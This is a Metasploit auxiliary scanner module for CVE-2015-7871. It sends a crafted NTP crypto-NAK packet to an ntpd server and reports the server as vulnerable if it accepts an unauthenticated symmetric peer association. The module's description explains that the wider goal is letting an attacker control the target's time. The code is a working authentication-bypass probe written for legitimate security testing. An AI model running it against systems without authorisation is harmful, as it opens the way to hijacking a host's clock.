##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::Udp

  SYMMETRIC_ACTIVE_MODE = Rex::Proto::NTP::Constants::Mode::SYMMETRIC_ACTIVE
  SYMMETRIC_PASSIVE_MODE = Rex::Proto::NTP::Constants::Mode::SYMMETRIC_PASSIVE

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'NTP "NAK to the Future"',
        'Description' => %q{
          Crypto-NAK packets can be used to cause ntpd to accept time from
          unauthenticated ephemeral symmetric peers by bypassing the
          authentication required to mobilize peer associations.  This module
          sends these Crypto-NAK packets in order to establish an association
          between the target ntpd instance and the attacking client.  The end goal
          is to cause ntpd to declare the legitimate peers "false tickers" and
          choose the attacking clients as the preferred peers, allowing
          these peers to control time.
        },
        'Author' => [
          'Matthew Van Gundy of Cisco ASIG', # vulnerability discovery
          'Jon Hart <jon_hart[at]rapid7.com>' # original metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'URL', 'http://talosintel.com/reports/TALOS-2015-0069/' ],
          [ 'URL', 'https://www.cisco.com/c/en/us/support/docs/availability/high-availability/19643-ntpm.html' ],
          [ 'URL', 'https://support.ntp.org/bin/view/Main/NtpBug2941' ],
          [ 'CVE', '2015-7871' ]
        ],
        'Notes' => {
          'Reliability' => UNKNOWN_RELIABILITY,
          'Stability' => UNKNOWN_STABILITY,
          'SideEffects' => UNKNOWN_SIDE_EFFECTS
        }
      )
    )
  end

  def build_crypto_nak(time)
    probe = Rex::Proto::NTP::Header::NTPHeader.new
    probe.version_number = 3
    probe.stratum = 1
    probe.poll = 10
    probe.mode = SYMMETRIC_ACTIVE_MODE
    unless time
      time = Time.now
    end

    # TODO: use different values for each?
    probe.reference_timestamp = time
    probe.origin_timestamp = time
    probe.receive_timestamp = time
    probe.transmit_timestamp = time
    # key-id 0
    probe.key_identifier = 0
    probe
  end

  def check
    connect_udp

    # pick a random 64-bit timestamp
    canary_timestamp = Time.now.utc - (60 * 5)
    probe = build_crypto_nak(canary_timestamp)
    udp_sock.put(probe.to_binary_s)

    expected_length = probe.offset_of(probe.key_identifier)
    response = udp_sock.timed_read(expected_length)
    disconnect_udp
    if response.length == expected_length
      ntp_symmetric = Rex::Proto::NTP::Header::NTPHeader.read(response)
      if ntp_symmetric.mode == SYMMETRIC_PASSIVE_MODE && ntp_symmetric.origin_timestamp == nil
        vprint_good("#{rhost}:#{rport} - NTP - VULNERABLE: Accepted a NTP symmetric active association")
        report_vuln(
          host: rhost,
          port: rport.to_i,
          proto: 'udp',
          sname: 'ntp',
          name: 'NTP "NAK to the Future"',
          info: 'Accepted an NTP symmetric active association by replying with a symmetric passive request',
          refs: references
        )
        return Exploit::CheckCode::Appears
      end
    end

    Exploit::CheckCode::Unknown
  end

  def run_host(_ip)
    check
  end
end
